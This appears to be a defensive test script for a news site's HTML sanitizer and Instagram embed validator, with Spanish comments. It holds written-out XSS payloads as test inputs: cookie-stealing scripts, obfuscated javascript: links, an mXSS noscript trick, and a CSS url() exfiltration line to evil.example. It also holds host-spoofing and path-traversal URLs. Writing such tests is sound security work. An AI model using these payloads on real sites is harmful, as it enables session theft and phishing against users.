/**
 * Verifica que `lib/sanitizar.ts` bloquea los vectores de XSS conocidos y
 * conserva el contenido legítimo de una noticia.
 *
 * ─────────────────────────────────────────────────────────────────────────────
 * CÓMO CORRERLO (Node 24: importa el .ts directo, sin compilar)
 *
 *   node scripts/verificar-sanitizacion.mjs
 *
 * No toca la base de datos ni la red.
 * ─────────────────────────────────────────────────────────────────────────────
 *
 * Cada caso de ataque declara lo que NO puede aparecer en la salida. Los casos
 * legítimos declaran lo que SÍ tiene que sobrevivir: un sanitizador que lo
 * borra todo también "bloquea" todos los ataques.
 *
 * También verifica el validador de embeds de Instagram (`lib/embed-instagram.ts`):
 * el iframe se arma con lo que devuelve, así que es la allowlist de ese embed.
 */

import { sanitizarHtml } from "../lib/sanitizar.ts";
import { REMOTE_PATTERNS } from "../lib/imagenes-remotas.ts";
import { validarInstagram, urlInstagram } from "../lib/embed-instagram.ts";

/** Hosts permitidos para <img>, leídos de la misma lista que usa el sanitizador. */
const STORAGE = REMOTE_PATTERNS[0].hostname; // Supabase de la tienda (solo /storage/v1/object/public/)
const CHANNEL = REMOTE_PATTERNS[1].hostname; // Supabase del Channel (solo /storage/v1/object/public/)

const ATAQUES = [
  {
    nombre: "1. <script> inline",
    html: `<p>hola</p><script>alert(document.cookie)</script>`,
    prohibido: [/<script/i, /alert/],
  },
  {
    nombre: "2. Handler de evento (img onerror)",
    html: `<img src="x" onerror="alert(1)">`,
    prohibido: [/onerror/i, /alert/],
  },
  {
    nombre: "3. href javascript:",
    html: `<a href="javascript:alert(1)">clic</a>`,
    prohibido: [/javascript:/i],
  },
  {
    nombre: "4. javascript: ofuscado (entidad, tab, mayúsculas)",
    html:
      `<a href="java&#x09;script:alert(1)">a</a>` +
      `<a href="&#106;avascript:alert(1)">b</a>` +
      `<a href=" JaVaScRiPt:alert(1)">c</a>` +
      `<a href="vbscript:msgbox(1)">d</a>` +
      `<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">e</a>`,
    prohibido: [/href="[^"]*script:/i, /href="\s*data:/i, /vbscript/i],
  },
  {
    nombre: "5. <iframe> de un tercero",
    html: `<iframe src="https://evil.example/phish"></iframe><p>ok</p>`,
    prohibido: [/<iframe/i, /evil\.example/],
  },
  {
    nombre: "6. SVG / MathML con script",
    html:
      `<svg onload="alert(1)"><script>alert(2)</script></svg>` +
      `<math><mtext><script>alert(3)</script></mtext></math>`,
    prohibido: [/<svg/i, /<math/i, /onload/i, /alert/],
  },
  {
    nombre: "7. Atributo style (exfiltración con url())",
    html: `<p style="background:url(https://evil.example/x?c=1)">texto</p>`,
    prohibido: [/style=/i, /evil\.example/],
  },
  {
    nombre: "8. <form> de phishing",
    html: `<form action="https://evil.example"><input name="password"><button>Entrar</button></form>`,
    prohibido: [/<form/i, /<input/i, /<button/i, /evil\.example/],
  },
  {
    nombre: "9. mXSS: cierre de <noscript> dentro de un atributo",
    html: `<noscript><p title="</noscript><img src=x onerror=alert(1)>"></noscript>`,
    prohibido: [/onerror/i, /alert/],
  },
  {
    nombre: "10. Tabnabbing: target/rel del autor se pisan",
    html: `<a href="https://ok.example" target="_self" rel="opener">x</a>`,
    prohibido: [/rel="opener"/, /target="_self"/],
    exigido: [/target="_blank"/, /rel="noopener noreferrer"/],
  },
  {
    nombre: "11. <object>/<embed>/<base>/<meta>",
    html:
      `<object data="https://evil.example/x.swf"></object><embed src="https://evil.example/y">` +
      `<base href="https://evil.example/"><meta http-equiv="refresh" content="0;url=https://evil.example">`,
    prohibido: [/<object/i, /<embed/i, /<base/i, /<meta/i, /evil\.example/],
  },
  // ── <img>: solo https de los hosts de lib/imagenes-remotas.ts ──
  {
    nombre: "12. <img> de un host externo (pixel de rastreo)",
    html: `<p>a</p><img src="https://evil.example/pixel.gif" alt="x"><p>b</p>`,
    prohibido: [/<img/i, /evil\.example/],
    exigido: [/<p>a<\/p>/, /<p>b<\/p>/],
  },
  {
    nombre: "13. <img> http (no https) de nuestro Storage",
    html: `<img src="http://${STORAGE}/storage/v1/object/public/noticias/a.jpg">`,
    prohibido: [/<img/i],
  },
  {
    nombre: "14. <img> con data: URI",
    html: `<img src="data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=" alt="x">`,
    prohibido: [/<img/i, /data:/i],
  },
  {
    nombre: "15. <img> protocol-relative y ruta local",
    html: `<img src="//${STORAGE}/storage/v1/object/public/noticias/a.jpg"><img src="/logo.png">`,
    prohibido: [/<img/i],
  },
  {
    nombre: "16. <img> con host disfrazado (userinfo, subdominio, ruta)",
    html:
      `<img src="https://${STORAGE}@evil.example/a.jpg">` +
      `<img src="https://${STORAGE}.evil.example/a.jpg">` +
      `<img src="https://evil.example/${STORAGE}/a.jpg">`,
    prohibido: [/<img/i, /evil\.example/],
  },
  {
    nombre: "17. <img> del Channel fuera de /storage/v1/object/public/",
    html: `<img src="https://${CHANNEL}/auth/v1/authorize?x=1">`,
    prohibido: [/<img/i],
  },
  {
    nombre: "18. <img> permitida pierde todo atributo fuera de src/alt/width/height",
    html:
      `<img src="https://${STORAGE}/storage/v1/object/public/noticias/a.jpg" alt="ok" ` +
      `title="t" class="c" style="x:url(https://evil.example)" srcset="https://evil.example/b.jpg 2x" ` +
      `onerror="alert(1)" width="100%;x" height="javascript:1">`,
    prohibido: [/title=/, /class=/, /style=/, /srcset/, /onerror/, /width=/, /height=/, /evil\.example/, /alert/],
    exigido: [/<img/, /alt="ok"/],
  },
  {
    nombre: "19. <img> de la tienda fuera de /storage/v1/object/public/",
    html:
      `<img src="https://${STORAGE}/rest/v1/artistas?select=*">` +
      `<img src="https://${STORAGE}/storage/v1/object/sign/productos/a.jpg?token=x">` +
      `<img src="https://${STORAGE}/storage/v1/object/publicx/a.jpg">` +
      `<img src="https://${STORAGE}:8443/storage/v1/object/public/productos/a.jpg">`,
    prohibido: [/<img/i],
  },
  // ── Instagram pegado como HTML: los embeds van solo por shortcode ──
  {
    nombre: "20. Código de inserción oficial de Instagram (blockquote + embed.js)",
    html:
      `<blockquote class="instagram-media" data-instgrm-permalink="https://www.instagram.com/p/C1a2b3c4d5e/">` +
      `<a href="https://www.instagram.com/p/C1a2b3c4d5e/">post</a></blockquote>` +
      `<script async src="//www.instagram.com/embed.js"></script>`,
    prohibido: [/<script/i, /embed\.js/, /data-instgrm/],
  },
  {
    nombre: "21. <iframe> de Instagram pegado a mano",
    html: `<iframe src="https://www.instagram.com/p/C1a2b3c4d5e/embed/"></iframe><p>ok</p>`,
    prohibido: [/<iframe/i],
  },
];

/**
 * Embeds de Instagram. `esperado`: lo que tiene que devolver `validarInstagram`
 * ("p/CODIGO", "reel/CODIGO" o null).
 */
const INSTAGRAM = [
  // Rechazos
  { nombre: "Otro dominio", bruto: "https://evil.example/p/C1a2b3c4d5e/", esperado: null },
  { nombre: "Dominio que contiene instagram.com", bruto: "https://instagram.com.evil.example/p/C1a2b3c4d5e/", esperado: null },
  { nombre: "Subdominio no permitido", bruto: "https://evil.instagram.com/p/C1a2b3c4d5e/", esperado: null },
  { nombre: "Host en la ruta", bruto: "https://evil.example/www.instagram.com/p/C1a2b3c4d5e/", esperado: null },
  { nombre: "Userinfo (instagram.com@evil)", bruto: "https://www.instagram.com@evil.example/p/C1a2b3c4d5e/", esperado: null },
  { nombre: "http en vez de https", bruto: "http://www.instagram.com/p/C1a2b3c4d5e/", esperado: null },
  { nombre: "javascript:", bruto: "javascript:alert(1)//instagram.com/p/C1a2b3c4d5e/", esperado: null },
  { nombre: "Código con comillas y <script>", bruto: `p/C1a2"><script>alert(1)</script>`, esperado: null },
  { nombre: "Código con ../ (path traversal)", bruto: "p/../../accounts/login", esperado: null },
  { nombre: "Código con %2F codificado", bruto: "https://www.instagram.com/p/abc%2F..%2Fx/", esperado: null },
  { nombre: "Código con espacio", bruto: "reel/abc def", esperado: null },
  { nombre: "Código con punto", bruto: "https://www.instagram.com/p/abc.def/", esperado: null },
  { nombre: "Historia (no es post)", bruto: "https://www.instagram.com/stories/usuario/123456789/", esperado: null },
  { nombre: "Perfil (no es post)", bruto: "https://www.instagram.com/muzikchilecl/", esperado: null },
  { nombre: "Tipo inventado", bruto: "embed/C1a2b3c4d5e", esperado: null },
  // Aceptados
  { nombre: "/p/ con www", bruto: "https://www.instagram.com/p/C1a2b3c4d5e/", esperado: "p/C1a2b3c4d5e" },
  { nombre: "/reel/ sin www ni barra final", bruto: "https://instagram.com/reel/DA-b_c9XyZ1", esperado: "reel/DA-b_c9XyZ1" },
  { nombre: "/tv/ se embebe como post", bruto: "https://www.instagram.com/tv/CB1a2b3c4d5/", esperado: "p/CB1a2b3c4d5" },
  { nombre: "Con ?igsh=", bruto: "https://www.instagram.com/reel/DA1b2c3d4e5/?igsh=MWQ1ZGUxMzBkMA==", esperado: "reel/DA1b2c3d4e5" },
  { nombre: "Con ?utm_source= y #hash", bruto: "https://www.instagram.com/p/C1a2b3c4d5e/?utm_source=ig_web_copy_link#x", esperado: "p/C1a2b3c4d5e" },
  { nombre: "Con usuario en la ruta", bruto: "https://www.instagram.com/muzikchilecl/p/C1a2b3c4d5e/", esperado: "p/C1a2b3c4d5e" },
  { nombre: "m.instagram.com", bruto: "https://m.instagram.com/p/C1a2b3c4d5e/", esperado: "p/C1a2b3c4d5e" },
  { nombre: "Formato guardado p/CODIGO", bruto: "p/C1a2b3c4d5e", esperado: "p/C1a2b3c4d5e" },
  { nombre: "Formato guardado reel/CODIGO con espacios", bruto: "  reel/DA1b2c3d4e5 ", esperado: "reel/DA1b2c3d4e5" },
];

const LEGITIMOS = [
  {
    nombre: "Texto con formato, listas y cita",
    html:
      `<h2>Título</h2><p><strong>Negrita</strong>, <em>cursiva</em>, <u>sub</u> y <s>tachado</s>.</p>` +
      `<ul><li>uno</li><li>dos</li></ul><ol><li>tres</li></ol><blockquote>cita</blockquote><hr>`,
    exigido: [/<h2>Título<\/h2>/, /<strong>Negrita<\/strong>/, /<li>uno<\/li>/, /<blockquote>cita<\/blockquote>/, /<hr/],
  },
  {
    nombre: "Enlaces http, mailto, ruta y ancla",
    html:
      `<a href="https://muzikchile.cl" title="t">a</a><a href="mailto:hola@muzikchile.cl">b</a>` +
      `<a href="/noticias">c</a><a href="#arriba">d</a>`,
    exigido: [/href="https:\/\/muzikchile\.cl"/, /href="mailto:hola@muzikchile\.cl"/, /href="\/noticias"/, /href="#arriba"/, /title="t"/],
  },
  {
    nombre: "Imagen del bucket noticias con alt, width, height y figura",
    html:
      `<figure><img src="https://${STORAGE}/storage/v1/object/public/noticias/1760470000000-afiche.jpg" ` +
      `alt="foto" width="640" height="800"><figcaption>pie</figcaption></figure>`,
    exigido: [
      new RegExp(`<img[^>]+src="https://${STORAGE.replaceAll(".", "\\.")}/storage/v1/object/public/noticias/[^"]+"`),
      /alt="foto"/, /width="640"/, /height="800"/, /<figcaption>pie<\/figcaption>/,
    ],
  },
  {
    nombre: "Imagen del bucket productos (cuerpo de una publicación de artista)",
    html:
      `<img src="https://${STORAGE}/storage/v1/object/public/productos/` +
      `0b6c1f0e-7a3d-4c55-9a51-2f1e8d7c9b10/publicaciones/1760470000000-portada.jpg" alt="portada">`,
    exigido: [
      new RegExp(`<img[^>]+src="https://${STORAGE.replaceAll(".", "\\.")}/storage/v1/object/public/productos/[^"]+/publicaciones/[^"]+"`),
      /alt="portada"/,
    ],
  },
  {
    nombre: "Imagen migrada del Channel (blog-images)",
    html: `<img src="https://${CHANNEL}/storage/v1/object/public/blog-images/nota.jpg" alt="nota">`,
    exigido: [/<img[^>]+src="https:\/\/yxqhtljhoceopnbcwdiy\.supabase\.co\/storage\/v1\/object\/public\/blog-images\/nota\.jpg"/],
  },
  {
    nombre: "Texto de etiquetas no permitidas se conserva",
    html: `<section><p>dentro de section</p></section><font>dentro de font</font>`,
    exigido: [/dentro de section/, /dentro de font/],
  },
];

let fallos = 0;
const ok = (msg) => console.log(`  ✓ ${msg}`);
const mal = (msg, salida) => {
  fallos++;
  console.log(`  ✗ ${msg}\n      salida: ${salida}`);
};

console.log("Ataques — deben quedar bloqueados\n");
for (const c of ATAQUES) {
  const salida = sanitizarHtml(c.html);
  const pasa = c.prohibido.find((r) => r.test(salida));
  const falta = (c.exigido ?? []).find((r) => !r.test(salida));
  if (pasa) mal(`${c.nombre} — pasó ${pasa}`, salida);
  else if (falta) mal(`${c.nombre} — falta ${falta}`, salida);
  else ok(c.nombre);
}

console.log("\nContenido legítimo — debe sobrevivir\n");
for (const c of LEGITIMOS) {
  const salida = sanitizarHtml(c.html);
  const falta = c.exigido.find((r) => !r.test(salida));
  if (falta) mal(`${c.nombre} — falta ${falta}`, salida);
  else ok(c.nombre);
}

console.log("\nEmbeds de Instagram — solo código validado de instagram.com\n");
for (const c of INSTAGRAM) {
  const salida = validarInstagram(c.bruto);
  if (salida !== c.esperado) {
    mal(`${c.nombre} — esperaba ${c.esperado}`, salida);
    continue;
  }
  // Lo aceptado tiene que producir un iframe a www.instagram.com y nada más.
  if (salida !== null) {
    const url = new URL(urlInstagram(salida));
    if (url.origin !== "https://www.instagram.com" || !/^\/(p|reel)\/[A-Za-z0-9_-]+\/embed\/captioned\/$/.test(url.pathname)) {
      mal(`${c.nombre} — URL de iframe inesperada`, url.href);
      continue;
    }
  }
  ok(c.nombre);
}

const total = ATAQUES.length + LEGITIMOS.length + INSTAGRAM.length;
console.log("\n" + "─".repeat(60));
console.log(`Resultado: ${total - fallos}/${total} casos OK`);
process.exit(fallos ? 1 : 0);
